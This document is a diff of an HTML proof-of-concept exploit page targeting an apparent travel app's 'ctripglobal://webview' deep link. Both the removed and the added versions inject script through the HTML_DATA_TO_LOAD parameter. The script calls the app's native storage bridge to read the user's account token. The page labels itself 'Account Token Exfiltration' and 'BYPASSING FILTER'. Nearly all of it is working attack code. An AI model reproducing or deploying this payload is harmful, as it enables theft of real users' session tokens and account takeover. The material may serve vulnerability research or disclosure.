@@ -1,62 +1,10 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Internal Pivot - Stage 2</title>
-    <style>
-        body { background: #0d1117; color: #58a6ff; font-family: monospace; text-align: center; padding: 50px; }
-        .btn { background: #238636; color: white; padding: 20px; border-radius: 8px; border: none; font-weight: bold; cursor: pointer; }
-        #status { margin-top: 20px; color: #8b949e; }
-    </style>
-</head>
 <body>
-    <h1>INTERNAL PIVOT ACTIVE</h1>
-    <p>Target: Account Token Exfiltration</p>
-
-    <button id="attackBtn" class="btn">EXECUTE ATTACK</button>
-    <div id="status">Status: Ready.</div>
-
-    <script>
-        document.getElementById('attackBtn').onclick = function() {
-            document.getElementById('status').innerText = "Status: Firing Intent...";
-            
-            const payload = `
-            <html><body style="background:black;color:lime;padding:20px;font-family:monospace;">
-                <h2>[+] SUCCESS: BYPASS COMPLETE</h2>
-                <div id="out">Extracting Token...</div>
-                <script>
-                    window.__bridge_callback = function(d) {
-                        try {
-                            var dec = atob(d);
-                            document.getElementById('out').innerHTML = "<h3>TOKEN FOUND:</h3>" + dec;
-                        } catch(e) { document.getElementById('out').innerText = "Raw: " + d; }
-                    };
-                    setTimeout(function() {
-                        if(window.IBUStorageV2_a) {
-                            window.IBUStorageV2_a.IBUGetUserValue(JSON.stringify({
-                                "bussiness": "common", 
-                                "key": "token",
-                                "callback_tagname": "tok"
-                            }));
-                        }
-                    }, 1000);
-                <\/script>
-            </body></html>`;
-
-            // Strategy: Use a dummy URL to satisfy the Router logic
-            const finalUrl = "ctripglobal://webview?url=http://localhost&HTML_DATA_TO_LOAD=" + encodeURIComponent(payload);
-            
-            // Method: Programmatic click to trigger WebViewClient redirection
-            const trigger = document.createElement('a');
-            trigger.href = finalUrl;
-            document.body.appendChild(trigger);
-            trigger.click();
-            
-            // Fallback
-            setTimeout(() => {
-                window.location.replace(finalUrl);
-            }, 500);
-        };
-    </script>
+    <h1>STAGE 2: BYPASSING FILTER</h1>
+    <form id="attackForm" action="ctripglobal://webview" method="GET">
+        <input type="hidden" name="HTML_DATA_TO_LOAD" value="<html><body><script>alert(window.IBUStorageV2_a.IBUGetUserValue(JSON.stringify({'bussiness':'common','key':'token','callback_tagname':'tok'})))<\/script></body></html>">
+        <button type="submit" style="padding:20px; background:green; color:white;">FINAL EXECUTE</button>
+    </form>
 </body>
 </html>
